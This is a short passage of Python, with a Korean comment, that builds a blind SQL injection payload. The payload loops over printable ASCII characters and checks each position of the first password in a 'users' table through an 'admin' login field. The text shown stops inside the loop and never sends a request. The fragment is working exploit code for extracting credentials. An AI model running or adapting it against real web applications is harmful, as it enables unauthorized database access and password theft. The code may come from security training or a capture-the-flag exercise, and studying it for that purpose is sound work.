...
chars = ''.join([chr(i) for i in range(32, 127)])  # ASCII 값 범위: 32부터 126까지 모든 문자
position = 1  # We will start with the first character of the column name

while True:
    for char in chars:
        payload = f"admin' AND (ASCII(SUBSTRING((select password from users limit 0,1), {position}, 1)) = ASCII('{char}')) -- "
